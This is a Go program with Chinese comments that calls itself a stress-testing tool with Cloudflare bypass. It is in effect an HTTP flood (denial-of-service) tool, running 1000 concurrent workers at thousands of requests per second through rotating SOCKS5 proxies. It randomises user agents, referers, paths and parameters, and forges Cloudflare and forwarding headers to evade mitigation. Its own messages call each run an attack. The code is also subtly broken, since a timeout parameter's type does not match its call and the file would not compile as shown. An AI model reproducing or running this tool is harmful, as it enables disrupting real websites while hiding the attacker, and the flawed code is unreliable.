package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	
	"github.com/EDDYCJY/fake-useragent"
)

// 配置结构
type Config struct {
	TargetURL     string
	Mode          string
	Threads       int
	RPS           int
	Duration      int
	Timeout       int
	ProxyFile     string
	CFBypass      bool
	RandomPath    bool
	RandomParams  bool
}

// 统计信息
type Stats struct {
	TotalRequests    int64
	SuccessfulReqs   int64
	FailedReqs       int64
	CurrentRPS       float64
	AvgRPS           float64
	StartTime        time.Time
	LastStatsTime    time.Time
	LastTotalReqs    int64
	mu               sync.RWMutex
}

// 全局统计
var stats = &Stats{
	StartTime: time.Now(),
}

// 随机User-Agent生成器
var uaGenerator *fakeuseragent.UserAgent


// 代理列表
var proxies []string

func main() {
	// 解析命令行参数
	config := parseArgs()
	
	// 初始化随机UA生成器
	uaGenerator = fakeuseragent.New()
	
	// 加载代理
	loadProxies(config.ProxyFile)
	
	fmt.Printf("🚀 高级压力测试工具 - CF绕过版\n")
	fmt.Printf("目标: %s\n", config.TargetURL)
	fmt.Printf("模式: %s\n", config.Mode)
	fmt.Printf("线程: %d\n", config.Threads)
	fmt.Printf("RPS: %d\n", config.RPS)
	fmt.Printf("时长: %d秒\n", config.Duration)
	if len(proxies) > 0 {
		fmt.Printf("代理数: %d (SOCKS5代理模式)\n", len(proxies))
	} else {
		fmt.Printf("代理数: 0 (直连模式)\n")
	}
	fmt.Printf("CF绕过: %v\n", config.CFBypass)
	
	// 启动统计协程
	go statsReporter()
	
	// 启动攻击
	startAttack(config)
}

func parseArgs() *Config {
	config := &Config{
		TargetURL:     "https://example.com",
		Mode:          "get",
		Threads:       1000,
		RPS:           5000,
		Duration:      60,
		Timeout:       10,
		ProxyFile:     "socks5.txt",
		CFBypass:      true,
		RandomPath:    true,
		RandomParams:  true,
	}
	
	// 解析命令行参数
	flag.StringVar(&config.TargetURL, "url", config.TargetURL, "目标URL")
	flag.StringVar(&config.Mode, "mode", config.Mode, "攻击模式 (get/post/head)")
	flag.IntVar(&config.Threads, "threads", config.Threads, "线程数")
	flag.IntVar(&config.RPS, "rps", config.RPS, "每秒请求数")
	flag.IntVar(&config.Duration, "duration", config.Duration, "持续时间(秒)")
	flag.IntVar(&config.Timeout, "timeout", config.Timeout, "超时时间(秒)")
	flag.StringVar(&config.ProxyFile, "proxy-file", config.ProxyFile, "SOCKS5代理文件")
	flag.BoolVar(&config.CFBypass, "cf-bypass", config.CFBypass, "启用CF绕过")
	flag.BoolVar(&config.RandomPath, "random-path", config.RandomPath, "随机路径")
	flag.BoolVar(&config.RandomParams, "random-params", config.RandomParams, "随机参数")
	flag.Parse()
	
	// 如果还有位置参数，使用它们
	args := flag.Args()
	if len(args) >= 4 {
		config.Mode = args[0]
		config.TargetURL = args[1]
		if t, err := strconv.Atoi(args[2]); err == nil {
			config.Threads = t
		}
		if r, err := strconv.Atoi(args[3]); err == nil {
			config.RPS = r
		}
	}
	
	return config
}

func loadProxies(filename string) {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("⚠️  无法加载代理文件 %s: %v\n", filename, err)
		fmt.Printf("将使用直连模式\n")
		return
	}
	defer file.Close()
	
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			proxies = append(proxies, line)
		}
	}
	
	if len(proxies) == 0 {
		fmt.Printf("⚠️  代理文件为空，将使用直连模式\n")
	} else {
		fmt.Printf("✅ 加载了 %d 个SOCKS5代理\n", len(proxies))
	}
}



func startAttack(config *Config) {
	// 创建限流器
	rateLimiter := time.NewTicker(time.Second / time.Duration(config.RPS))
	defer rateLimiter.Stop()
	
	// 创建超时器
	timeout := time.After(time.Duration(config.Duration) * time.Second)
	
	// 启动工作协程
	var wg sync.WaitGroup
	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			worker(config, rateLimiter.C)
		}()
	}
	
	// 等待超时
	<-timeout
	
	fmt.Println("\n⏰ 攻击时间结束，等待所有请求完成...")
	wg.Wait()
	
	// 打印最终统计
	printFinalStats()
}

func worker(config *Config, rateLimit <-chan time.Time) {
	for {
		select {
		case <-rateLimit:
			// 执行攻击
			success := performAttack(config)
			atomic.AddInt64(&stats.TotalRequests, 1)
			if success {
				atomic.AddInt64(&stats.SuccessfulReqs, 1)
			} else {
				atomic.AddInt64(&stats.FailedReqs, 1)
			}
		}
	}
}

func performAttack(config *Config) bool {
	// 解析URL
	u, err := url.Parse(config.TargetURL)
	if err != nil {
		return false
	}
	
	// 选择代理
	var client *http.Client
	if len(proxies) > 0 {
		proxy := proxies[rand.Intn(len(proxies))]
		client = createSOCKS5Client(proxy, config.Timeout)
	} else {
		// 代理为空，使用直连
		client = createDirectClient(config.Timeout)
	}
	
	// 创建请求
	var req *http.Request
	switch config.Mode {
	case "get":
		req, err = http.NewRequest("GET", config.TargetURL, nil)
	case "post":
		req, err = http.NewRequest("POST", config.TargetURL, strings.NewReader("data=test"))
	case "head":
		req, err = http.NewRequest("HEAD", config.TargetURL, nil)
	default:
		req, err = http.NewRequest("GET", config.TargetURL, nil)
	}
	
	if err != nil {
		return false
	}
	
	// 设置高级头
	setAdvancedHeaders(req, config)
	
	// 发送请求
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	
	// 读取响应（可选）
	io.Copy(io.Discard, resp.Body)
	
	return resp.StatusCode < 500
}

func createSOCKS5Client(proxy, timeout string) *http.Client {
	// 解析SOCKS5代理
	parts := strings.Split(proxy, ":")
	if len(parts) != 2 {
		return createDirectClient(10)
	}
	
	host := parts[0]
	port := parts[1]
	
	// 创建SOCKS5代理
	proxyURL, _ := url.Parse(fmt.Sprintf("socks5://%s:%s", host, port))
	
	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         "", // 让TLS自动检测
		},
		DisableKeepAlives: true,
		MaxIdleConns:      0,
		MaxIdleConnsPerHost: 0,
		IdleConnTimeout:   0,
	}
	
	timeoutDuration, _ := time.ParseDuration(timeout + "s")
	
	return &http.Client{
		Transport: transport,
		Timeout:   timeoutDuration,
	}
}

func createDirectClient(timeout int) *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		DisableKeepAlives: true,
		MaxIdleConns:      0,
		MaxIdleConnsPerHost: 0,
		IdleConnTimeout:   0,
	}
	
	return &http.Client{
		Transport: transport,
		Timeout:   time.Duration(timeout) * time.Second,
	}
}

func setAdvancedHeaders(req *http.Request, config *Config) {
	// 随机User-Agent - 使用第三方库生成
	userAgent := uaGenerator.Random()
	req.Header.Set("User-Agent", userAgent)
	
	// 随机Referer - 完全随机生成
	req.Header.Set("Referer", generateRandomReferer())
	
	// 随机生成HTTP头 - 实现上亿万万个组合
	generateRandomHeaders(req, config)
	
	// CF绕过特殊头
	if config.CFBypass {
		req.Header.Set("CF-IPCountry", "US")
		req.Header.Set("CF-Ray", generateCFRay())
		req.Header.Set("CF-Visitor", `{"scheme":"https"}`)
	}
	
	// 随机路径和参数
	if config.RandomPath {
		req.URL.Path = generateRandomPath()
	}
	
	if config.RandomParams {
		req.URL.RawQuery = generateRandomParams()
	}
}

func generateCFRay() string {
	// 生成CF-Ray ID
	chars := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	result := make([]byte, 16)
	for i := range result {
		result[i] = chars[rand.Intn(len(chars))]
	}
	return string(result)
}

func generateRandomPath() string {
	paths := []string{
		"/",
		"/index.html",
		"/home",
		"/about",
		"/contact",
		"/products",
		"/services",
		"/blog",
		"/news",
		"/api/v1/status",
		"/api/v2/users",
		"/api/v3/data",
		"/admin",
		"/dashboard",
		"/profile",
		"/settings",
		"/login",
		"/register",
		"/search",
		"/category",
	}
	return paths[rand.Intn(len(paths))]
}

func generateRandomParams() string {
	params := []string{
		"t=" + strconv.FormatInt(time.Now().Unix(), 10),
		"_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
		"v=" + strconv.Itoa(rand.Intn(100)),
		"ref=" + []string{"google", "bing", "yahoo", "direct"}[rand.Intn(4)],
		"utm_source=" + []string{"google", "facebook", "twitter", "email"}[rand.Intn(4)],
		"utm_medium=" + []string{"cpc", "cpm", "organic", "social"}[rand.Intn(4)],
		"utm_campaign=" + generateRandomString(8),
		"session_id=" + generateRandomString(32),
		"user_id=" + strconv.Itoa(rand.Intn(10000)),
		"page=" + strconv.Itoa(rand.Intn(100)),
	}
	
	// 随机选择3-7个参数
	numParams := rand.Intn(5) + 3
	selectedParams := make([]string, numParams)
	for i := 0; i < numParams; i++ {
		selectedParams[i] = params[rand.Intn(len(params))]
	}
	
	return strings.Join(selectedParams, "&")
}

func generateRandomString(length int) string {
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = chars[rand.Intn(len(chars))]
	}
	return string(result)
}

func generateRandomReferer() string {
	domains := []string{
		"google.com", "bing.com", "yahoo.com", "duckduckgo.com",
		"baidu.com", "sogou.com", "so.com", "360.cn",
		"facebook.com", "twitter.com", "instagram.com", "youtube.com",
		"reddit.com", "github.com", "stackoverflow.com", "amazon.com",
		"ebay.com", "wikipedia.org", "cnn.com", "bbc.com",
		"nytimes.com", "washingtonpost.com", "reuters.com", "bloomberg.com",
		"forbes.com", "wsj.com", "ft.com", "linkedin.com",
		"pinterest.com", "tumblr.com", "medium.com", "quora.com",
		"microsoft.com", "apple.com", "netflix.com", "spotify.com",
		"twitch.tv", "discord.com", "slack.com", "zoom.us",
		"dropbox.com", "onedrive.com", "icloud.com", "gmail.com",
		"outlook.com", "hotmail.com", "yahoo.com", "aol.com",
	}
	
	paths := []string{
		"/", "/search", "/search?q=", "/home", "/about", "/contact",
		"/products", "/services", "/blog", "/news", "/help", "/support",
		"/login", "/register", "/profile", "/settings", "/dashboard",
		"/api", "/api/v1", "/api/v2", "/admin", "/user", "/account",
		"/category", "/tags", "/archive", "/sitemap", "/rss", "/feed",
		"/download", "/upload", "/files", "/documents", "/images",
		"/videos", "/audio", "/music", "/games", "/apps", "/tools",
	}
	
	domain := domains[rand.Intn(len(domains))]
	path := paths[rand.Intn(len(paths))]
	
	// 随机添加查询参数
	if strings.Contains(path, "?") {
		params := []string{"test", "search", "query", "q", "keyword", "term", "id", "page", "sort", "filter"}
		param := params[rand.Intn(len(params))]
		path += param + "=" + generateRandomString(rand.Intn(15)+3)
	}
	
	// 随机添加更多查询参数
	if rand.Float32() < 0.3 {
		extraParams := []string{"utm_source", "utm_medium", "utm_campaign", "ref", "source", "from"}
		param := extraParams[rand.Intn(len(extraParams))]
		path += "&" + param + "=" + generateRandomString(rand.Intn(10)+3)
	}
	
	return "https://www." + domain + path
}

func generateRandomHeaders(req *http.Request, config *Config) {
	// 随机选择HTTP头数量 (5-15个)
	headerCount := rand.Intn(11) + 5
	selectedHeaders := make(map[string]bool)
	
	// 基础头列表 - 更多样化
	acceptTypes := []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	}
	
	languages := []string{
		"en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
		"en-US,en;q=0.9",
		"zh-CN,zh;q=0.9,en;q=0.8",
		"en-GB,en;q=0.9,en-US;q=0.8",
		"ja-JP,ja;q=0.9,en;q=0.8",
		"de-DE,de;q=0.9,en;q=0.8",
		"fr-FR,fr;q=0.9,en;q=0.8",
		"es-ES,es;q=0.9,en;q=0.8",
		"ru-RU,ru;q=0.9,en;q=0.8",
		"ko-KR,ko;q=0.9,en;q=0.8",
	}
	
	encodings := []string{
		"gzip, deflate, br",
		"gzip, deflate",
		"gzip, br",
		"deflate, br",
		"gzip",
		"deflate",
		"br",
		"gzip, deflate, br, zstd",
	}
	
	cacheControls := []string{
		"no-cache",
		"max-age=0",
		"no-store, no-cache, must-revalidate",
		"no-cache, no-store, must-revalidate",
		"max-age=3600",
		"private",
		"public",
		"no-cache, private",
	}
	
	// 随机设置基础头
	req.Header.Set("Accept", acceptTypes[rand.Intn(len(acceptTypes))])
	req.Header.Set("Accept-Language", languages[rand.Intn(len(languages))])
	req.Header.Set("Accept-Encoding", encodings[rand.Intn(len(encodings))])
	req.Header.Set("Cache-Control", cacheControls[rand.Intn(len(cacheControls))])
	
	// 随机设置Pragma
	if rand.Float32() < 0.7 {
		req.Header.Set("Pragma", "no-cache")
	}
	
	// 随机设置Sec-Ch-Ua头
	chromeVersions := []string{"120", "119", "121", "118", "117", "116", "115", "114"}
	version := chromeVersions[rand.Intn(len(chromeVersions))]
	req.Header.Set("Sec-Ch-Ua", fmt.Sprintf("\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"%s\", \"Google Chrome\";v=\"%s\"", version, version))
	
	// 随机设置Sec-Ch-Ua-Mobile
	req.Header.Set("Sec-Ch-Ua-Mobile", []string{"?0", "?1"}[rand.Intn(2)])
	
	// 随机设置Sec-Ch-Ua-Platform
	platforms := []string{"Windows", "macOS", "Linux", "Chrome OS", "Android", "iOS"}
	req.Header.Set("Sec-Ch-Ua-Platform", fmt.Sprintf("\"%s\"", platforms[rand.Intn(len(platforms))]))
	
	// 随机设置Sec-Fetch头
	secFetchDests := []string{"document", "empty", "frame", "iframe", "image", "script", "style", "worker"}
	req.Header.Set("Sec-Fetch-Dest", secFetchDests[rand.Intn(len(secFetchDests))])
	
	secFetchModes := []string{"navigate", "cors", "no-cors", "same-origin", "websocket"}
	req.Header.Set("Sec-Fetch-Mode", secFetchModes[rand.Intn(len(secFetchModes))])
	
	secFetchSites := []string{"none", "same-origin", "cross-site", "same-site"}
	req.Header.Set("Sec-Fetch-Site", secFetchSites[rand.Intn(len(secFetchSites))])
	
	req.Header.Set("Sec-Fetch-User", []string{"?1", "?0"}[rand.Intn(2)])
	
	// 随机设置其他头
	if rand.Float32() < 0.8 {
		req.Header.Set("Upgrade-Insecure-Requests", "1")
	}
	
	if rand.Float32() < 0.6 {
		req.Header.Set("DNT", []string{"1", "0"}[rand.Intn(2)])
	}
	
	req.Header.Set("Connection", []string{"keep-alive", "close"}[rand.Intn(2)])
	
	// 随机添加额外的自定义头
	extraHeaders := []string{
		"X-Requested-With", "X-Forwarded-For", "X-Real-IP", "X-Forwarded-Proto",
		"X-Forwarded-Host", "X-Forwarded-Port", "X-Original-URL", "X-Rewrite-URL",
		"X-Http-Method-Override", "X-Request-ID", "X-Correlation-ID", "X-Trace-ID",
		"X-Client-IP", "X-Remote-IP", "X-Client-Port", "X-Server-Name",
		"X-Server-Port", "X-Scheme", "X-Forwarded-Ssl", "X-Forwarded-Scheme",
	}
	
	for i := 0; i < rand.Intn(5); i++ {
		header := extraHeaders[rand.Intn(len(extraHeaders))]
		if !selectedHeaders[header] {
			req.Header.Set(header, generateRandomString(rand.Intn(20)+5))
			selectedHeaders[header] = true
		}
	}
}

func statsReporter() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for range ticker.C {
		stats.mu.Lock()
		now := time.Now()
		
		// 计算当前RPS
		timeDiff := now.Sub(stats.LastStatsTime).Seconds()
		if timeDiff >= 1.0 {
			currentRPS := float64(stats.TotalRequests-stats.LastTotalReqs) / timeDiff
			stats.CurrentRPS = currentRPS
			stats.LastTotalReqs = stats.TotalRequests
			stats.LastStatsTime = now
		}
		
		// 计算平均RPS
		uptime := now.Sub(stats.StartTime).Seconds()
		if uptime > 0 {
			stats.AvgRPS = float64(stats.TotalRequests) / uptime
		}
		
		// 打印统计
		fmt.Printf("\r📊 总请求: %d | 成功: %d | 失败: %d | 当前RPS: %.2f | 平均RPS: %.2f | 运行时间: %.1fs",
			stats.TotalRequests, stats.SuccessfulReqs, stats.FailedReqs, 
			stats.CurrentRPS, stats.AvgRPS, uptime)
		
		// 输出JSON格式供web_panel解析
		statsJSON := map[string]interface{}{
			"total_requests":    stats.TotalRequests,
			"successful_requests": stats.SuccessfulReqs,
			"failed_requests":   stats.FailedReqs,
			"current_rps":       stats.CurrentRPS,
			"avg_rps":          stats.AvgRPS,
			"uptime":           uptime,
		}
		jsonData, _ := json.Marshal(statsJSON)
		fmt.Printf("\nSTATS_JSON:%s\n", string(jsonData))
		
		stats.mu.Unlock()
	}
}

func printFinalStats() {
	stats.mu.RLock()
	defer stats.mu.RUnlock()
	
	uptime := time.Since(stats.StartTime).Seconds()
	
	fmt.Printf("\n\n🎯 攻击完成！\n")
	fmt.Printf("总请求数: %d\n", stats.TotalRequests)
	fmt.Printf("成功请求: %d\n", stats.SuccessfulReqs)
	fmt.Printf("失败请求: %d\n", stats.FailedReqs)
	fmt.Printf("成功率: %.2f%%\n", float64(stats.SuccessfulReqs)/float64(stats.TotalRequests)*100)
	fmt.Printf("平均RPS: %.2f\n", stats.AvgRPS)
	fmt.Printf("运行时间: %.2f秒\n", uptime)
}